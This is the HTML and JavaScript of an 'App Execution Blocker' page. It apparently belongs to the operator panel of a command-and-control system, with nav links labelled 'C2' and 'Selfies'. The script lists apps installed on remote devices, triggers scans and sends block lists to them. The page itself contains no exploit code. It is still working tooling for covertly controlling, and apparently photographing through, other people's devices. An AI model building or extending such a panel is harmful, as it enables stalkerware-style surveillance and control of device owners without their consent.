<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anasio | App Blocker</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css">
    <style>
        html { scrollbar-gutter: stable; }
        .spinning { animation: spin .8s linear infinite; display: inline-block; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .app-card { animation: fadeIn .15s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(3px); } to { opacity: 1; transform: none; } }
        .toggle-knob { transition: left .2s; }
    </style>
</head>
<body class="bg-gray-100 text-gray-900 font-sans min-h-screen">
    <div id="toast-container" class="fixed top-4 right-4 z-[9999] flex flex-col gap-2 pointer-events-none"></div>
    <div class="max-w-7xl mx-auto py-8 px-4 sm:px-6">

        <!-- Nav -->
        <nav class="mb-6 flex flex-wrap justify-between items-center bg-white px-5 py-4 rounded-2xl border border-gray-200 gap-4">
            <div class="flex items-center gap-3">
                <div class="bg-purple-50 text-purple-600 p-2.5 rounded-xl">
                    <i class="ti ti-lock text-xl"></i>
                </div>
                <div>
                    <p class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest">Application Management</p>
                    <h1 class="text-xl font-semibold text-gray-900 leading-tight">App Execution Blocker</h1>
                </div>
            </div>
            <div class="flex flex-wrap items-center gap-1.5">
                <a href="/" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-2.5 py-1.5 rounded-lg transition">
                    <i class="ti ti-cpu text-sm"></i> C2
                </a>
                <a href="/selfies_view" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-2.5 py-1.5 rounded-lg transition">
                    <i class="ti ti-camera text-sm"></i> Selfies
                </a>
                <a href="/errors_view" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-2.5 py-1.5 rounded-lg transition"><i class="ti ti-alert-circle text-sm"></i> Diag</a>
                <a href="/updater_view" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-2.5 py-1.5 rounded-lg transition"><i class="ti ti-refresh-alert text-sm"></i> Update</a>
                <a href="/history_view" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-2.5 py-1.5 rounded-lg transition"><i class="ti ti-history text-sm"></i> History</a>
                <a href="/piano_view" class="flex items-center gap-1.5 text-xs font-medium text-gray-600 hover:text-gray-900 hover:bg-gray-100 px-2.5 py-1.5 rounded-lg transition"><i class="ti ti-music text-sm"></i> Piano</a>
                <div class="w-px h-5 bg-gray-200 mx-1"></div>
                <select id="device-select" aria-label="Select device"
                    class="bg-white text-gray-800 font-medium text-sm border border-gray-200 rounded-lg px-3 py-1.5 focus:outline-none focus:ring-2 focus:ring-purple-400 cursor-pointer hover:border-purple-300 transition appearance-none pr-7">
                    <option value="">Loading…</option>
                </select>
                <div class="w-px h-5 bg-gray-200"></div>
                <a href="/logout" class="flex items-center gap-1.5 text-xs font-medium bg-red-50 text-red-600 hover:bg-red-100 border border-red-200 px-3 py-1.5 rounded-lg transition"><i class="ti ti-logout text-sm"></i> Logout</a>
            </div>
        </nav>

        <!-- Main card -->
        <div class="bg-white rounded-2xl border border-gray-200 p-5">
            <!-- Header -->
            <div class="flex items-center justify-between mb-4">
                <div class="flex items-center gap-2 text-xs font-semibold text-gray-400 uppercase tracking-widest">
                    <i class="ti ti-apps"></i> Installed Applications
                </div>
                <button id="scan-btn" type="button"
                    class="flex items-center gap-2 text-xs font-medium bg-purple-50 text-purple-700 hover:bg-purple-100 border border-transparent px-3.5 py-1.5 rounded-lg transition disabled:opacity-50">
                    <i id="scan-icon" class="ti ti-scan text-sm"></i> Request Device Scan
                </button>
            </div>

            <!-- Stats -->
            <div class="grid grid-cols-1 sm:grid-cols-3 gap-3 mb-5">
                <div class="bg-gray-50 rounded-xl p-4 border border-gray-100">
                    <p class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest mb-2 flex items-center gap-1">
                        <i class="ti ti-device-mobile text-xs"></i> Installed
                    </p>
                    <p id="stat-installed" class="text-2xl font-semibold text-purple-700">—</p>
                </div>
                <div class="bg-gray-50 rounded-xl p-4 border border-gray-100">
                    <p class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest mb-2 flex items-center gap-1">
                        <i class="ti ti-ban text-xs"></i> Blocked
                    </p>
                    <p id="stat-blocked" class="text-2xl font-semibold text-red-600">—</p>
                </div>
                <div class="bg-gray-50 rounded-xl p-4 border border-gray-100">
                    <p class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest mb-2 flex items-center gap-1">
                        <i class="ti ti-wifi text-xs"></i> Device Status
                    </p>
                    <div id="stat-status">
                        <span class="inline-flex items-center gap-1.5 text-sm font-medium bg-gray-100 text-gray-500 px-3 py-1 rounded-full">
                            <span class="w-1.5 h-1.5 rounded-full bg-current"></span>Checking
                        </span>
                    </div>
                </div>
            </div>

            <!-- App grid -->
            <div id="apps-container" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2">
                <div class="col-span-full flex flex-col items-center justify-center py-12 gap-2 text-gray-400">
                    <i class="ti ti-loader-2 text-3xl spinning"></i>
                    <p class="text-sm">Loading applications…</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        const selectEl = document.getElementById('device-select');
        const statInstalled = document.getElementById('stat-installed');
        const statBlocked = document.getElementById('stat-blocked');
        const statStatus = document.getElementById('stat-status');
        const appsContainer = document.getElementById('apps-container');
        const scanBtn = document.getElementById('scan-btn');
        const scanIcon = document.getElementById('scan-icon');
        let currentInstalled = [];
        let currentBlocked = [];

        function escapeHtml(str) {
            return String(str ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
        }

        function setStatus(state) {
            const map = {
                online:   `<span class="inline-flex items-center gap-1.5 text-sm font-medium bg-green-100 text-green-700 px-3 py-1 rounded-full"><span class="w-1.5 h-1.5 rounded-full bg-current"></span>Online</span>`,
                offline:  `<span class="inline-flex items-center gap-1.5 text-sm font-medium bg-red-100 text-red-600 px-3 py-1 rounded-full"><span class="w-1.5 h-1.5 rounded-full bg-current"></span>Offline</span>`,
                checking: `<span class="inline-flex items-center gap-1.5 text-sm font-medium bg-gray-100 text-gray-500 px-3 py-1 rounded-full"><span class="w-1.5 h-1.5 rounded-full bg-current"></span>Checking</span>`,
            };
            statStatus.innerHTML = map[state] || map.checking;
        }

        function buildAppCard(app, isBlocked) {
            const card = document.createElement('div');
            card.className = `app-card flex items-center justify-between gap-3 p-3 rounded-xl border cursor-pointer transition-all ${
                isBlocked ? 'bg-red-50 border-red-200 hover:bg-red-100' : 'bg-white border-gray-200 hover:border-gray-300 hover:bg-gray-50'
            }`;
            card.setAttribute('role', 'button');
            card.setAttribute('aria-pressed', isBlocked ? 'true' : 'false');
            card.setAttribute('aria-label', `${app} — ${isBlocked ? 'blocked, click to allow' : 'allowed, click to block'}`);
            card.innerHTML = `
                <div class="overflow-hidden flex-1">
                    <div class="text-sm font-medium truncate ${isBlocked ? 'text-red-800' : 'text-gray-800'}">${escapeHtml(app)}</div>
                    <div class="text-[10px] uppercase font-semibold tracking-wider mt-0.5 ${isBlocked ? 'text-red-500' : 'text-gray-400'}">${isBlocked ? 'Blocked' : 'Allowed'}</div>
                </div>
                <div class="flex-shrink-0 w-9 h-5 rounded-full relative ${isBlocked ? 'bg-red-500' : 'bg-gray-300'} transition-colors">
                    <div class="toggle-knob w-3.5 h-3.5 rounded-full bg-white absolute top-[3px] ${isBlocked ? 'left-[19px]' : 'left-[3px]'}"></div>
                </div>`;
            card.addEventListener('click', () => toggleBlock(app, !isBlocked));
            return card;
        }

        function sectionDivider(label, icon, colorClass) {
            const div = document.createElement('div');
            div.className = `col-span-full flex items-center gap-2 text-xs font-semibold uppercase tracking-wider pt-3 pb-1 border-t border-gray-100 mt-1 ${colorClass}`;
            div.innerHTML = `<i class="ti ${icon} text-sm"></i>${label}`;
            return div;
        }

        function renderApps() {
            appsContainer.innerHTML = '';
            const allPkgs = new Set([...currentInstalled, ...currentBlocked]);
            if (!allPkgs.size) {
                appsContainer.innerHTML = `<div class="col-span-full flex flex-col items-center justify-center py-12 gap-2 text-gray-400">
                    <i class="ti ti-scan text-3xl"></i><p class="text-sm">No app list available — request a device scan</p></div>`;
                return;
            }
            const blockedOnly = currentBlocked.filter(a => !currentInstalled.includes(a)).sort();
            if (blockedOnly.length) {
                appsContainer.appendChild(sectionDivider('Blocked (not in last scan)', 'ti-ban', 'text-red-500'));
                blockedOnly.forEach(app => appsContainer.appendChild(buildAppCard(app, true)));
            }
            const blocked = currentInstalled.filter(a => currentBlocked.includes(a)).sort();
            const allowed = currentInstalled.filter(a => !currentBlocked.includes(a)).sort();
            if (blocked.length) {
                appsContainer.appendChild(sectionDivider('Blocked', 'ti-ban', 'text-red-500'));
                blocked.forEach(app => appsContainer.appendChild(buildAppCard(app, true)));
            }
            if (allowed.length) {
                appsContainer.appendChild(sectionDivider('Allowed', 'ti-circle-check', 'text-gray-400'));
                allowed.forEach(app => appsContainer.appendChild(buildAppCard(app, false)));
            }
        }

        async function fetchDevices() {
            try {
                const res = await fetch('/devices');
                if (!res.ok) return;
                const data = await res.json();
                const devices = data.devices || [];
                const prev = selectEl.value;
                selectEl.innerHTML = '';
                if (!devices.length) { selectEl.innerHTML = '<option value="">No devices</option>'; return; }
                devices.forEach(d => {
                    const opt = document.createElement('option');
                    opt.value = d; opt.textContent = d; selectEl.appendChild(opt);
                });
                selectEl.value = devices.includes(prev) ? prev : devices[0];
            } catch(e) { console.error(e); }
        }

        async function fetchApps() {
            if (!selectEl.value) return;
            try {
                const res = await fetch(`/stats?device_id=${encodeURIComponent(selectEl.value)}`);
                if (!res.ok) throw new Error();
                const data = await res.json();
                const installed = (data.installed_apps || '').trim()
                    ? data.installed_apps.split(',').map(a => a.trim()).filter(Boolean) : [];
                const blocked = (data.blocked_apps || '').trim()
                    ? data.blocked_apps.split(',').map(a => a.trim()).filter(Boolean) : [];
                statInstalled.textContent = installed.length;
                statBlocked.textContent = blocked.length;
                setStatus(data.is_online ? 'online' : 'offline');
                if (JSON.stringify(installed) !== JSON.stringify(currentInstalled) ||
                    JSON.stringify(blocked) !== JSON.stringify(currentBlocked)) {
                    currentInstalled = installed;
                    currentBlocked = blocked;
                    renderApps();
                }
            } catch(e) { setStatus('offline'); console.error(e); }
        }

        async function toggleBlock(app, block) {
            let nb = [...currentBlocked];
            if (block && !nb.includes(app)) nb.push(app);
            else if (!block) nb = nb.filter(a => a !== app);
            currentBlocked = nb;
            statBlocked.textContent = nb.length;
            renderApps();
            if (!selectEl.value) return;
            try {
                await fetch('/set_blocked_apps', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ device_id: selectEl.value, apps: nb.join(',') })
                });
            } catch(e) { console.error('Failed to update blocked apps', e); }
        }

        async function requestScan() {
            if (!selectEl.value) { alert('No device selected'); return; }
            scanBtn.disabled = true;
            scanIcon.className = 'ti ti-loader-2 text-sm spinning';
            const fd = new FormData();
            fd.append('device_id', selectEl.value);
            try { await fetch('/request_installed_apps', { method: 'POST', body: fd }); } catch(e) {}
            setTimeout(() => {
                scanBtn.disabled = false;
                scanIcon.className = 'ti ti-scan text-sm';
                fetchApps();
            }, 3000);
        }

        scanBtn.addEventListener('click', requestScan);
        selectEl.addEventListener('change', fetchApps);

        (async () => {
            await fetchDevices();
            await fetchApps();
            setInterval(() => { if (document.visibilityState === 'visible') fetchApps(); }, 15000);
        })();
    </script>
</body>
</html>
